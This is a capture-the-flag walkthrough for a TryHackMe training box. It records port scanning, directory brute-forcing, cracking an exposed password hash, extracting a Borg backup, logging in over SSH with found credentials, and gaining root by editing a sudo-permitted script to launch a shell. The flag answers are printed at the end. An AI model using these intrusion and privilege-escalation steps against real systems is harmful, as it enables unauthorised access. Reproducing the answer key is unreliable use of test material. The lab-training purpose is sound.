---
A box involving encrypted archives, source code analysis and more
---
## vpn

``` tryhackme-vpn
sudo openvpn WittyAle.ovpn
``` 

### ping

``` 
ping 10.10.181.155
```

### rustscan

```
rustscan -a 10.10.181.155 --ulimit 5000 -b 65535 -- -A 
```

### gobuster

```
gobuster dir --url http://10.10.181.155 -w /usr/share/wordlists/dirb/common.txt -t 30 -k -x py,html,txt
```
==/admin , /etc==

 ~~10.10.181.155/etc/squid/passwd~~

`music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`

### john

``` hash
john --wordlist=/usr/share/wordlists/rockyou.txt passwd 
```

```
 john passwd --show  
```

==cracked -> music_archive:squidward==
 
~~10.10.181.155/admin/admin.html~~
`download -> archive.tar`

### Borg Backup

```cyborg
tar -xf archive.tar
```

```
tree home
```

```
cd cyborg/home/field/dev
```

```
borg list final_archive 
```

==passphrase:  squidward==

```
borg list final_archive::music_archive
```

```
borg extract final_archive::music_archive
```

```
cat home/alex/Desktop/secret.txt
```
> shoutout to all the people who have gotten to this stage whoop whoop!"

```
cat home/alex/Documents/note.txt 
```
>Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

`alex:S3cretP@s3`

### ssh

```
ssh alex@10.10.181.155
```

### priv esc

```
sudo -l
```

==(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh==

```
chmod 777 /etc/mp3backups/backup.sh
```

```
nano /etc/mp3backups/backup.sh
```

`add #2 line -> sudo /bin/bash`

```root
sudo /etc/mp3backups/backup.sh 
```

- Scan the machine, how many ports are open? *2* 
- What service is running on port 22? *ssh*
- What service is running on port 80? *http*
- What is the user.txt flag? *flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}*
- What is the root.txt flag? *flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}*




